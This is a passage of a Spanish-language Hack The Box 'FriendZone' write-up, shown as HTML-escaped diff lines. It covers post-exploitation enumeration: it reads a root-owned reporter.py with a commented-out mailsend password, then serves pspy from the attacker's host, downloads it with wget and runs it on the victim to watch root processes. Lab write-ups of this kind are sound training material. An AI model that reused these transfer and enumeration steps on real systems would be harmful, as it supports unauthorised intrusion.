-friend@FriendZone:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-total 4
-drwxr-xr-x 2 root root 4096 Jan 24  2019 server_admin
-friend@FriendZone:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;server_admin/
-friend@FriendZone:/opt/server_admin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-total 4
-&lt;span class=&quot;nt&quot;&gt;-rwxr--r--&lt;/span&gt; 1 root root 424 Jan 16  2019 reporter.py
-friend@FriendZone:/opt/server_admin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;reporter.py 
-&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
-
-import os
-
-to_address &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;admin1@friendzone.com&quot;&lt;/span&gt;
-from_address &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;admin2@friendzone.com&quot;&lt;/span&gt;
-
-print &lt;span class=&quot;s2&quot;&gt;&quot;[+] Trying to send email to %s&quot;&lt;/span&gt;%to_address
-
-&lt;span class=&quot;c&quot;&gt;#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass &quot;PAPAP&quot;'''&lt;/span&gt;
-
-&lt;span class=&quot;c&quot;&gt;#os.system(command)&lt;/span&gt;
-
-&lt;span class=&quot;c&quot;&gt;# I need to edit the script later&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Sam ~ python developer&lt;/span&gt;
-friend@FriendZone:/opt/server_admin&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Bajo la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/server_admin&lt;/code&gt; nos encontramos con un archivo curioso llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reporter.py&lt;/code&gt; cuyo propietario es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;. Podríamos pensar que el programa se está ejecuntando a intervalos regulares y lo podemos corroborar con la utilidad &lt;a href=&quot;https://github.com/DominicBreuker/pspy&quot;&gt;pspy&lt;/a&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /opt/pspy
-❯ &lt;span class=&quot;nv&quot;&gt;GOOS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;linux &lt;span class=&quot;nv&quot;&gt;GOARCH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;amd64 go build &lt;span class=&quot;nt&quot;&gt;-ldflags&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;-s -w&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-❯ &lt;span class=&quot;nb&quot;&gt;du&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-hc&lt;/span&gt; pspy
-2.7M    pspy
-2.7M    total
-❯ upx brute pspy
-                       Ultimate Packer &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;eXecutables
-                          Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1996 - 2020
-UPX 3.96        Markus Oberhumer, Laszlo Molnar &amp;amp; John Reiser   Jan 23rd 2020
-
-        File size         Ratio      Format      Name
-   &lt;span class=&quot;nt&quot;&gt;--------------------&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
-upx: brute: FileNotFoundException: brute: No such file or directory
-   2748416 -&amp;gt;   1059396   38.55%   linux/amd64   pspy                          
-
-Packed 1 file.
-❯ &lt;span class=&quot;nb&quot;&gt;du&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-hc&lt;/span&gt; pspy
-1.1M    pspy
-1.1M    total
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Transfermimos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pspy&lt;/code&gt; a la máquina víctima y lo ejecutamos:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
-Serving HTTP on 0.0.0.0 port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
-10.10.10.123 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;06/Dec/2021 22:45:36] &lt;span class=&quot;s2&quot;&gt;&quot;GET /pspy HTTP/1.1&quot;&lt;/span&gt; 200 -
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;friend@FriendZone:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://10.10.14.27/pspy
-&lt;span class=&quot;nt&quot;&gt;--2021-12-07&lt;/span&gt; 06:50:34--  http://10.10.14.27/pspy
-Connecting to 10.10.14.27:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 1059396 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.0M&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;application/octet-stream]
-Saving to: ‘pspy’
-
-pspy                             100%[&lt;span class=&quot;o&quot;&gt;=======================================================&amp;gt;]&lt;/span&gt;   1.01M   932KB/s    &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;1.1s    
-
-2021-12-07 06:50:35 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;932 KB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - ‘pspy’ saved &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1059396/1059396]
-
-friend@FriendZone:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x pspy
-friend@FriendZone:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./pspy
-pspy - version:  - Commit SHA:                                                                                                   
-                                                                                                                                 
-                                                                                                                                 
-     ██▓███    ██████  ██▓███ ▓██   ██▓                                                                                          
-    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒                                                                                          
-    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░                                                                                          
-    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░               
-    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░        
-    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒              
-    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░                                                                                           
-    ░░       ░  ░  ░  ░░       ▒ ▒ ░░                                                                                            
-                   ░           ░ ░                                                                                               
-                               ░ ░                                                                                               
-                                                                
-Config: Printing events &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;colored&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: &lt;span class=&quot;nv&quot;&gt;processes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt; | file-system-events&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;| Scannning &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;processes every 100ms and on 
-inotify events &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;| Watching directories: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/usr /tmp /etc /home /var /opt] &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;recursive&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;non-recursive&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Draining file system events due to startup...                                                                                    
-&lt;span class=&quot;k&quot;&gt;done                                                            
-&lt;/span&gt;2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;98     |            
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;9438   |                                                                                   2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;9      |                                                                                   
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;88     |                                                                                   
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;107  &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;853    | /usr/sbin/exim4 &lt;span class=&quot;nt&quot;&gt;-bd&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-q30m&lt;/span&gt;                                                         
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;849    | /usr/sbin/smbd &lt;span class=&quot;nt&quot;&gt;--foreground&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--no-process-group&lt;/span&gt;                                    
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;844    | /usr/sbin/smbd &lt;span class=&quot;nt&quot;&gt;--foreground&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--no-process-group&lt;/span&gt;                                    
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;843    | /usr/sbin/smbd &lt;span class=&quot;nt&quot;&gt;--foreground&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--no-process-group&lt;/span&gt;                                    
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;82     |                                                                                   
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;81     |                                                                                   
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80     | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8      | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;79     |                                                                                   
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;78     | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;77     |                                                                                   
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;741    | /usr/sbin/smbd &lt;span class=&quot;nt&quot;&gt;--foreground&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--no-process-group&lt;/span&gt; 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7      | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;6      | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;565    | /usr/sbin/nmbd &lt;span class=&quot;nt&quot;&gt;--foreground&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--no-process-group&lt;/span&gt; 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;558    | /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;556    | /sbin/agetty &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--noclear&lt;/span&gt; tty1 linux 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;535    | /usr/sbin/sshd &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;533    | /usr/sbin/vsftpd /etc/vsftpd.conf 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;109  &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;517    | /usr/sbin/named &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bind 
-&lt;/span&gt;2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000 &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;44084  | ./pspy
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;44055  | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4      | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;372    | /usr/lib/accountsservice/accounts-daemon 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;371    | /usr/bin/python3 /usr/bin/networkd-dispatcher &lt;span class=&quot;nt&quot;&gt;--run-startup-triggers&lt;/span&gt; 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;369    | /usr/bin/VGAuthService 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;103  &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;368    | /usr/bin/dbus-daemon &lt;span class=&quot;nt&quot;&gt;--system&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;systemd: &lt;span class=&quot;nt&quot;&gt;--nofork&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--nopidfile&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--systemd-ac&lt;/span&gt;
-tivation &lt;span class=&quot;nt&quot;&gt;--syslog-only&lt;/span&gt; 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;360    | /usr/sbin/cron &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;102  &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;359    | /usr/sbin/rsyslogd &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;358    | /lib/systemd/systemd-logind 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;35     | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;34     | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;62583 &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;338    | /lib/systemd/systemd-timesyncd 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;101  &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;335    | /lib/systemd/systemd-resolved 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;32     | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;30     | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;29     | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;28     | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;27     | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100  &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;269    | /lib/systemd/systemd-networkd 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;264    | /lib/systemd/systemd-udevd 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;26     | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;25     | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;24     | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;23     | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;226    | /lib/systemd/systemd-journald 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;225    | /usr/bin/vmtoolsd 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;22     | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33   &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2176   | /bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;21     | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;20     | 
